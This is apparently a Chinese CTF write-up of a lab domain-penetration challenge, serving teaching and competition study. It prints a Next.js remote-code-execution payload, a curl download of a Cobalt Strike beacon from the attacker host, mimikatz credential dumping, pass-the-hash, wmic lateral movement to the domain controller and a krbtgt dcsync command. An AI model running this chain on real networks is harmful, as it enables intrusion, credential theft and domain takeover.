---
title: 2026 新春杯 域渗透 WP
url: https://mp.weixin.qq.com/s/7WcYMZWjOHODeBFuxWBa0w
source: Doonsec's feed
date: 2026-02-11
fetch_date: 2026-02-12T04:17:13.411739
---

# 2026 新春杯 域渗透 WP

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/NP0zaFUZO5A3T8AcI6C9uNePql0ciaqqFXPiaXkDrDvjRj3rAiaL4hic90qHbNmvulAhniaoVcea1Brf1uDlNspWZ0AUNOhUApPdiaL31CtqTebf4/0?wx_fmt=jpeg)

# 2026 新春杯 域渗透 WP

原创

1ceLAND
1ceLAND

XNL Coding

![]()

在小说阅读器中沉浸阅读

# 也是很久没有写公众号了，这里本人突然想写因为好不容易 AK 一次渗透。

⚠️**安全声明**

本文档仅用于以下合法目的：

•网络安全教育与学术研究•授权渗透测试与安全评估•CTF竞赛解题过程分享•企业安全防护能力建设

**重要提醒：**

•文中涉及的技术仅可在自己拥有或获得明确授权的系统上使用•未经授权对他人系统进行测试属于违法行为•请遵守《网络安全法》及相关法律法规•建议在隔离的实验室环境中实践这些技术

# 域渗透

战况如下，嗯本人就这样拿下三个一血和唯一解，也是让本人踩到狗屎运了。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/NP0zaFUZO5BicbSKcSHfNGoDhwImxXXEjfPp1ic2Daz8Csh4mEhUP9hcIiclCDT1iaoibkelEWITAmLiaulTZF3Anicomef14SAbJTZqf8Ajxy3h6k/640?wx_fmt=png&from=appmsg)

这里将附件导入 Vmware 虚拟机，题目给出域拓扑如下：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/NP0zaFUZO5CUJic1x5PIREFMSMdCIPqcnicNxObn3UicTuOicibv34ud8C5iaEA0y4WNKEqTL7ZqGROyyYQpgmg1K2P8EDaysmO1zicQfFG71K3gHk/640?wx_fmt=png&from=appmsg)

外网地址：http://192.168.80.121:3000/

## 🐓 W10 外网服务器

访问web发现 nextjs ，可能是最近特别火🔥🔥🔥的 react2shell，但是是 windows 的 react2shell（你继续。。常规的 linux 脚本还打不了）。

所以这里使用 yakit 的 yak 插件下载后自己修改命令执行：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/NP0zaFUZO5CHziaZQMXHOpmb36CiapfDiaemibOHnqG9eShjWqnia0HX9P5dWyM5laicZJSiaduGic6cssDLg0ice91lPeQMWib5zxO7y0qib51icLpgsB0/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/NP0zaFUZO5ATsfgvSEo3pCu4bH9iaFANhG7nEgl1ArujPaibmCTFrqicLTgAa7CnqjZ3T4bY6icWLTzb85ibyC6iccr90Mk6ic6AvLXUricBMyJoIyo/640?wx_fmt=png&from=appmsg)

这里简单修改代码，然后执行windows命令时，

例如 "dir c:\Windows\Temp"，该命令需要通过 yak 代码编译器，然后是 js 代码编译器，最后是在 Windows cmd 中执行命令，这里需要两次转义符：`dir c:\\\\Windows\\\\Temp\\\\`：

（这里仅仅给出关键部分代码，完整代码见文末）

```
  var cmdPayload
  var command = ""

  if osType == "windows" {
      // Windows系统执行 cmd /c dir
      command = `type ..\\\\..\\\\flag\\\\flag01.txt.txt`
      cmdPayload = `var res=process.mainModule.require('child_process').execSync('` + command + `').toString('base64');throw Object.assign(new Error('NEXT_REDIRECT'),{digest: ` + "`NEXT_REDIRECT;push;/login?a=${res};307;`" + `});`
  } else {
      return false, "", ""
  }
```

接下来执行命令 `type ..\\\\..\\\\flag\\\\flag01.txt.txt`，得到 flag1。

### 🚩flag1

flag{dbf1ccdf-4888-4bfb-8b0e-ace7798a9783}

## 🐎 W10 上线持久化木马

现在我们能执行命令，下一步打域成员机： 内网：192.168.50.12

Cobaltstrike Teamserver 启动： 端口为 192.168.80.128:50050

![](https://mmbiz.qpic.cn/mmbiz_png/NP0zaFUZO5DJKg3Hd5NaZAlXWib5grutrLe9icG1BVyL6T95nG61Zq8boG6FTQrTcpcge1xJq9c67SWN3RBCibiasphsu6Q4F8B7zx8RZgfGQ04/640?wx_fmt=png&from=appmsg)

电脑本地启动：

![](https://mmbiz.qpic.cn/mmbiz_png/NP0zaFUZO5AMvZgA9ffj5K5sUZmmWUPHVPvcj8b8dCxc7oFoF0U0AKftqngGKAS0LjQWgdZUpSOy86ibN3LeicUkIicOY0rCa3YVckTIVWichUA/640?wx_fmt=png&from=appmsg)

连接成功：

![](https://mmbiz.qpic.cn/mmbiz_png/NP0zaFUZO5A4Hz6VTIP7J6jn7tYzEZwLw37ZGWQXhtCJMpEYuQm5VQLzd5S0Y7PiaatLp6pORYXwRL5LCicwJGMDw6tCI1tEY0gnibaahDeFbc/640?wx_fmt=png&from=appmsg)

### 1. 启动一个监听器

![](https://mmbiz.qpic.cn/mmbiz_png/NP0zaFUZO5BHgvjTEibCRSic8eibv41Uq5faZj7DHWdRkBkBFmEDiabmYibBCVosKxeD74smLywtKYC73HxxHnntJ7e0qYmSknjId8jZu5ticPt9s/640?wx_fmt=png&from=appmsg)

###

### 2. 生成木马 CS.exe

![](https://mmbiz.qpic.cn/sz_mmbiz_png/NP0zaFUZO5B8GHia1NNdwZicvlTItt9MRxpibicYfRHN1xVI1M8yYQZJMHVWBEKkQAJ8mkABlbNReCpjsxBKkPz3yCqrFPebrtqFuQggZGXTxZw/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/NP0zaFUZO5CeLPFN2IPib8toicnkBsW9EtibgB16TeNibibFKgVQXHRHn7Bic7Pl0JV6pAubibAXqfqPTmQianQPbcopN2xaD5ibt4KXQIHZgINM4owg/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/NP0zaFUZO5A6SSqd67JlpDiaf3k3nlvq6yejXU2wZHzsyySbuol9GPCnuWf0mTRCh0M0oK1ZribodksbJlQOiaxQktzu3ZJjWYyv3yO4WRnGjk/640?wx_fmt=png&from=appmsg)

###

上传到 kali 机并开启 http 服务，等待靶机下载： 下载地址：192.168.80.128:8000/CS.exe

执行

```
curl http://192.168.80.128:8000/CS.exe -o C:\\\\Windows\\\\Temp\\\\CS.exe

dir C:\\\\Windows\\\\Temp\\\\
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/NP0zaFUZO5CdvY9niaExokXzyNbeNsXM7xgUcUUyjzSlfdraLT7JzoPHlFSWGGLWwZ65VpjLPDJ9OnoxI1Jq3jlyLyLOziaDHVD311Lj5dBhA/640?wx_fmt=png&from=appmsg)

木马运行成功！外网服务器上线。

![](https://mmbiz.qpic.cn/mmbiz_png/NP0zaFUZO5DNGxRbmkKnl8exdhlquuGVjZ8U1EyebevOpE5olGto8kBicCQ2zFjZaJFQZcZgXdvsMfjk8zLzsRyA2B92P68AcR2ibAibqXAAcE/640?wx_fmt=png&from=appmsg)

## 🐓 域成员机 192.168.50.12

### 信息搜集

这里可以利用CS内置的 mimikatz（但是没抓到东西）：

```
logonpasswords
```

接下来在 beacon> 命令行中dumphush看看：

```
beacon> hashdump
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/NP0zaFUZO5BrugWxbiaJh3FAPZpKiauM0mQ7umwVxFhh9noda1V9QkG8agGmQWvJyib7TTa3xQ9t27btWZuticN0ul60bW9KGCrjHDrfhyNcKJ8/640?wx_fmt=png&from=appmsg)

1. Administrator 的密码为空！

* Hash: 31d6cfe0d16ae931b73c59d7e0c089c0
* 这是一个非常经典的 NTLM 哈希，它实际上对应的是 空密码 (Blank Password)。

2. 存在一个普通用户 N1tols

* Hash: 5d6c07b46d10bb00d41dd3dc85e8bbbc

这里扫描发现 445 开放，可以尝试哈希传递：

这里我们拿  N1tols 的密码哈希：5d6c07b46d10bb00d41dd3dc85e8bbbc，使用哈希传递进行验证：

```
pth .\N1tols 5d6c07b46d10bb00d41dd3dc85e8bbbc whoami
```

这里显示验证成功！ 那么接下来要进行会话持久化：

```
mimikatz sekurlsa::pth /user:N1tols /domain:. /ntlm:5d6c07b46d10bb00d41dd3dc85e8bbb
```

这里显示成功拿到： 执行后发现显示密码错误，这里说明其他机子用的不是同一个密码！

这里清除当前的 token 伪造：

```
rev2self
```

重新开始搜集： 内存看完看一下注册表：

```
mimikatz lsadump::secrets
```

发现之前存储过的明文密码！（注册表😘）

```
N1tols20462005
```

拿这个明文密码生成凭据：

```
make_token N1TOLS\Administrator N1tols20462005
shell dir \\192.168.50.12\c$
```

![](https://mmbiz.qpic.cn/mmbiz_png/NP0zaFUZO5AaqFaO5rrvAYv4rVJykxwPkYM9Op2VFOO6Y32eJP0iaccTA4Z0ibia65nWI1TppDP2ia9pf0JCG1D8Sc4makHfXnTzobft7ZDwuhY/640?wx_fmt=png&from=appmsg)

成功！！ 哈哈哈接下来我们投递 CS.exe

### 投递 CS2.exe

这里投递的 CS2.exe 应该是一个新的，因为这次我们要链接的是一台内网机子：

#### 创建一个 SMB 监听器

![](https://mmbiz.qpic.cn/mmbiz_png/NP0zaFUZO5AaRp4NEDetjBfjsWS1W3iaacjl9St9UJeZBFAUe9T5PRVjxHbohD2vnMn9fkPIxxVria1kMbKwxdSSa7c8MickCqc0dP6CxyNAl0/640?wx_fmt=png&from=appmsg)

#### 创建一个不出网的 CS2.exe （sbm2.exe）

#### 上传 smb2.exe

![](https://mmbiz.qpic.cn/mmbiz_png/NP0zaFUZO5A8xiaDhF61ODyvHG81WtC8fllu9Dib5AlqF2L9JIvSeLCc91ibFeMyCNQ13v28AGPY9xfibKIbZyRjDLTbicxpYYpshY3rpYC6TxBU/640?wx_fmt=png&from=appmsg)

#### 静默启动 + 静默连接

接下来我们在目标机器后台静默启动 + 静默连接：

```
shell wmic /node:192.168.50.12 process call create "C:\Windows\Temp\smb2.exe"
link 192.168.50.12
```

连接成功！！！！

全局搜索 flag，成功找到 flag2！

```
shell dir /s /b C:\*flag*
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/NP0zaFUZO5BHWdTxDI9Vicm53ZIjyuEIMS1eGDmZpeNL9gMn87zxY7Z0dsfLHDaX7QmzKHLNuKmJCjBFU6iclVxsBWWWVGwkTic5m6ibw6Egf2w/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/NP0zaFUZO5CdmfBFMtnVlf4lsDYNPvicKzowJvqEoBWjhj1vY0DkVLzibFw7Gm9maOKjGVCiaS3NTbJzJAzt6W2tCkHicDrK1pZmKDsJRXWgcMQ/640?wx_fmt=png&from=appmsg)

下载打开后发现其指向机器的 C:\Users\Administrator\flag\flag02.txt.txt

![](https://mmbiz.qpic.cn/sz_mmbiz_png/NP0zaFUZO5A9ZL63M8zGywMIeyRIIflHLEG3TSia0HiaFZBlQVL1SLibA76Ba9SBib3UDZ00n0QiciaUJPGJVrZc3iaFVjmS24engNR64aKzmU6Nfk/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/NP0zaFUZO5ArmWqdXHY4mmXU56JrRelcOicFn8DribTGu1twianwYUVY4ykYhdlgozK9RuIr91iacqx22G85SthRhIEibicMLzmcQ7hPRQ7dkOogk/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/NP0zaFUZO5CqrLSPlrflbbAPoiaJ1Xozw8iafHKAuokLicfjWDicvwLmNZyF7baCsibiaWJKLe6f1GfB6l2VgeNicWVLrIIiciaRoVuhLMhPk6uknpibY/640?wx_fmt=png&from=appmsg)

居然是永恒之蓝。我居然一开始没往这想，你继续。

### 🚩flag2

flag{MS17\_010\_i4\_very\_interesting!}

## 🐓 域控

惊喜发现，同样的密码能穿域控：

```
shell copy C:\Windows\Temp\smb2.exe \\192.168.50.57\c$\Windows\Temp\smb2.exe
shell wmic /node:192.168.50.57 process call create "C:\Windows\Temp\smb2.exe"
link 192.168.50.57
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/NP0zaFUZO5BibWvAibibDBsA4YIibFQjMeNRu8frWA8JetXoHp3x6EMW8nXs8pMuctZQ8k0oIEMBx3uKWtTSCZOgq1nMSpmohYvWAoGbnGASoa0/640?wx_fmt=png&from=appmsg)

拿下域控！

全局扫找到 flag03

![](https://mmbiz.qpic.cn/mmbiz_png/NP0zaFUZO5DNyJWaSK1yiavn9MHDTgNpJjG4HHcQGhBugog0qxia1Nez7icBe8TFLPicibBZ1WlVfVQYfcnthBdaPvUuzK2GrBfv3VKPhaGJ0cwI/640?wx_fmt=png&from=appmsg)

### 🚩flag3

flag{congratulations\_on\_mastering\_the\_simplest\_domain\_penetration\_technique!}

## 导出所有用户哈希 - 拿下域控标志

```
dcsync N1TOLS.region N1TOLS\krbtgt
```

如有侵权联系我。

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_...